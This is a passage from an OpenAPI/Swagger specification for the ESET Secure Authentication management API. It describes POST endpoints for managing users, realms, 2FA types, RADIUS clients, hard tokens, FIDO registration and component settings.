          }
        }
      }
    },
    "/manage/v2/GetPropertiesForCustomizableFields": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets possible properties for mobileNumber / email / displayName.",
        "description": "Gets properties from which customizable fields (SetCoreSettings) can be selected.",
        "operationId": "Manage.GetPropertiesForCustomizableFields",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetPropertiesForCustomizableFields"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/SchemaProperty"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetRadiusClientById": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets single RADIUS client definition.",
        "operationId": "Manage.GetRadiusClientById",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetRadiusClientById"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/RadiusClientSettings"
            }
          }
        }
      }
    },
    "/manage/v2/GetRadiusClients2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted RADIUS clients.",
        "description": "Gets defined RADIUS clients for the specified RADIUS server component.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.",
        "operationId": "Manage.GetRadiusClients2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetRadiusClients2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/RadiusClientsResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetRealmCategories": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets categories of existing realms.",
        "description": "Realm category is used to distinguish realms in GUI. Well known categories are: \"ad_ldap\", \"windows_computer\", \"custom\".",
        "operationId": "Manage.GetRealmCategories",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetRealmCategories"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/RealmCategoryInfo"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetRealms": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets user realms.",
        "description": "In AD mode, includes the realm corresponding to the default domain, too.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realmFilter</b>: If specified, returns only this realm.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Realm</b>: Basic realm information.\n<b>Settings</b>: Editable realm settings.",
        "operationId": "Manage.GetRealms",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetRealms"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/RealmInfo"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetReportFilterOptions": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets report event filter options.",
        "operationId": "Manage.GetReportFilterOptions",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetReportFilterOptions"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ReportFilterOptions"
            }
          }
        }
      }
    },
    "/manage/v2/GetSpecificComponentSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets settings for specific component.",
        "description": "Returns settings for specific component of the specified type.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Info</b>: Information about the component instance.\n<b>Settings</b>: Settings for the component instance.\n<b>Statistics</b>: Statistics about the component instance.",
        "operationId": "Manage.GetSpecificComponentSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetSpecificComponentSettings"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ComponentInfoWithSettings"
            }
          }
        }
      }
    },
    "/manage/v2/GetUserList": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets list of users.",
        "description": "Optionally specify realm, realm category or structure path.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>AuthenticationTypes</b>: Enabled authentication types for the user.\n<b>Realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>GlobalInfo</b>: Global profiles info used for warnings.",
        "operationId": "Manage.GetUserList",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetUserList"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/UserProfile"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetUserList2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted list of users.",
        "description": "Optionally specify realm, realm category or structure path.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.\n<b>filter/Realm</b>: Filtering by realm<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>FilteredItems/AuthenticationTypes</b>: Enabled authentication types for the user.\n<b>FilteredItems/Realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>FilteredItems/GlobalInfo</b>: Global profiles info used for warnings.",
        "operationId": "Manage.GetUserList2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetUserList2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/UserProfilesResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetUserProfile": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets information about the user.",
        "description": "Contains information about the user, their 2FA settings and 2FA state.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>AuthenticationTypes</b>: Enabled authentication types for the user.\n<b>Realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>GlobalInfo</b>: Global profiles info used for warnings.",
        "operationId": "Manage.GetUserProfile",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetUserProfile"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/UserProfile"
            }
          }
        }
      }
    },
    "/manage/v2/GetUserProfileByGuid": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets information about the user.",
        "description": "Contains information about the user, their 2FA settings and 2FA state.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>AuthenticationTypes</b>: Enabled authentication types for the user.\n<b>Realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>GlobalInfo</b>: Global profiles info used for warnings.",
        "operationId": "Manage.GetUserProfileByGuid",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetUserProfileByGuid"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/UserProfile"
            }
          }
        }
      }
    },
    "/manage/v2/GetUserProperties": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets user properties.",
        "description": "Gets properties usable in the DeliverySettings command lines (SetCoreSettings).",
        "operationId": "Manage.GetUserProperties",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetUserProperties"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/SchemaProperty"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetUserStatistics": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets total statistics about all existing users.",
        "operationId": "Manage.GetUserStatistics",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetUserStatistics"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/UserStatistics"
            }
          }
        }
      }
    },
    "/manage/v2/ImportHardTokensFromPskc": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Imports hard tokens.",
        "description": "Currently, only PSKC format is supported.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>ImportedHardTokens/AssignedUser_Realm</b>: If assigned, contains realm of the current owner.",
        "operationId": "Manage.ImportHardTokensFromPskc",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ImportHardTokensFromPskc"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/HardTokenImportResult"
            }
          }
        }
      }
    },
    "/manage/v2/MakeCredential": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Registers FIDO credential.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.MakeCredential",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_MakeCredential"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/MakeCredentialOptions": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Obtains FIDO options (challenge to be signed, etc.) to be passed to FIDO authenticator during registration process.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.MakeCredentialOptions",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_MakeCredentialOptions"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/Ping": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Check if the service is available.",
        "description": "Always returns true.",
        "operationId": "Manage.Ping",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Ping"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "boolean"
            }
          }
        }
      }
    },
    "/manage/v2/Provision": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sends mobile application to the user.",
        "description": "Returns mobile application installation link.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.Provision",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Provision"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/Provision_Multiaction": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sends mobile application to users.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.Provision_Multiaction",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Provision_Multiaction"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/ProvisionWithQR": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sends mobile application to the user.",
        "description": "Returns mobile application installation link with base64 provisioning QR img.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.ProvisionWithQR",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ProvisionWithQR"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ProvisioningLinkQR"
            }
          }
        }
      }
    },
    "/manage/v2/RealmImportUsers": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Imports users to a realm.",
        "description": "Currently, import from CSV and LDF is supported.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.\n<b>options</b>: Import options.",
        "operationId": "Manage.RealmImportUsers",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_RealmImportUsers"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/RealmImportUsersResult"
            }
          }
        }
      }
    },
    "/manage/v2/ResendValidationEmailIfRequired": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Resends validation email to notification target email if email validation is required.",
        "operationId": "Manage.ResendValidationEmailIfRequired",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ResendValidationEmailIfRequired"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "boolean"
            }
          }
        }
      }
    },
    "/manage/v2/ResynchronizeHardToken": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Updates counter of the hard token.",
        "description": "Specify 2 consecutive OTPs generated with the hard token.",
        "operationId": "Manage.ResynchronizeHardToken",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ResynchronizeHardToken"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/RevokeHardToken": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Revokes the specified hard token from a user.",
        "operationId": "Manage.RevokeHardToken",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_RevokeHardToken"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/RevokeHardToken_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Revokes the specified hard tokens from users.",
        "operationId": "Manage.RevokeHardToken_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_RevokeHardToken_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/RevokeHardTokenFromUser": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Revokes hard token from the specified user.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.RevokeHardTokenFromUser",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_RevokeHardTokenFromUser"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/RevokeHardTokenFromUser_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Revokes hard tokens from the specified users.",
        "description": "<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.RevokeHardTokenFromUser_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_RevokeHardTokenFromUser_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/SendFeedback": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sends a feedback message.",
        "description": "Sends a feedback message to the ESET. The product must be activated before.",
        "operationId": "Manage.SendFeedback",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SendFeedback"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetAuthenticationTypes": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets 2FA types for the user.",
        "description": "Send only values which have to be changed.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.SetAuthenticationTypes",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetAuthenticationTypes"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetAuthenticationTypes_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets 2FA types for the users.",
        "description": "Send only values which have to be changed.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.SetAuthenticationTypes_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetAuthenticationTypes_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/SetComponentSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets settings for components.",
        "description": "Multiple settings of multiple components can be changed at once. Maximum number is 100.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>components/Info</b>: Information about the component instance.\n<b>components/Settings</b>: Settings for the component instance.",
        "operationId": "Manage.SetComponentSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetComponentSettings"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetComponentSettings_Multiaction": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets settings for components.",
        "description": "One setting for multiple components can be changed at once.",
        "operationId": "Manage.SetComponentSettings_Multiaction",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetComponentSettings_Multiaction"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/SetComponentTypeSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets settings for a component type.",
        "description": "Multiple settings of multiple component types can be changed at once.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>componentTypes/Info</b>: Information about the component type instance.\n<b>componentTypes/Settings</b>: Settings for the component type.\n<b>componentTypes/Settings/LocalLoginSettings</b>: Contains settings for local logins, if it is a local logins component type.",
        "operationId": "Manage.SetComponentTypeSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetComponentTypeSettings"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetCoreSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets global settings.",
        "description": "Sets global settings of the Authentication Server. Specify only the settings which should be changed.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>settings/Delivery</b>: Options for message delivery. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>settings/DefaultUserConfig</b>: Default configuration for new users. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>settings/DefaultUserConfig/AuthenticationTypes</b>: Enabled authentication types. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>settings/Reports</b>: Reports settings.\n<b>settings/Reports/ElasticSearch</b>: Elasticsearch setting to be used for reports.\n<b>settings/FIDO</b>: FIDO settings.\n<b>settings/Notifications</b>: Notifications settings.\n<b>settings/EmailValidation</b>: Notifications email validation.\n<b>settings/Smtp</b>: SMTP server configuration. Used for sending notifications. Only on-prem.\n<b>settings/ManagementAccess</b>: Restriction to Authentication Server management. Only on-prem.",
        "operationId": "Manage.SetCoreSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetCoreSettings"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetRealmSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets realm properties.",
        "description": "All the specified properties will be changed.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.SetRealmSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetRealmSettings"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetUserProfileParams": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets user profile properties.",
        "description": "Specify only the settings in profileParams which should be changed.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.SetUserProfileParams",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetUserProfileParams"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/SetUserProfileParams_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Sets users profile properties.",
        "description": "Specify only the settings in profileParams which should be changed.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.SetUserProfileParams_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_SetUserProfileParams_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/StopMultiAction": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Stop progress of selected multi action.",
        "operationId": "Manage.StopMultiAction",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_StopMultiAction"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/UnlockUser": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Unlocks user if 2FA logins were locked.",
        "description": "2FA logins are locked automatically when there are too many failed attempts.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.UnlockUser",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UnlockUser"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/UnlockUsers_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Unlocks users if 2FA logins were locked.",
        "description": "2FA logins are locked automatically when there are too many failed attempts.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.UnlockUsers_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UnlockUsers_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/UnregisterComponentByKey": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Unregisters component instance.",
        "operationId": "Manage.UnregisterComponentByKey",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UnregisterComponentByKey"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/UnregisterComponentByKeys_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Unregisters component instance.",
        "operationId": "Manage.UnregisterComponentByKeys_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UnregisterComponentByKeys_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/UpdateApiCredentials": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Changes API credentials.",
        "description": "These parameters can be changed: Name, EnabledForAuthApi, EnabledForManagementApi. All these parameters must be always specified.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>updateParams</b>: New parameters. All values must be specified.",
        "operationId": "Manage.UpdateApiCredentials",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UpdateApiCredentials"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ApiConsumerSettingsPublic"
            }
          }
        }
      }
    },
    "/manage/v2/UpdateIdentityProviderConfiguration": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Updates Identity Provider configuration definition.",
        "description": "All settings have to be specified. Use GetIdentityProviderConfigurationById to obtain them.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>configuration/OriginalIdentityProvider</b>: Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.",
        "operationId": "Manage.UpdateIdentityProviderConfiguration",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UpdateIdentityProviderConfiguration"
            }
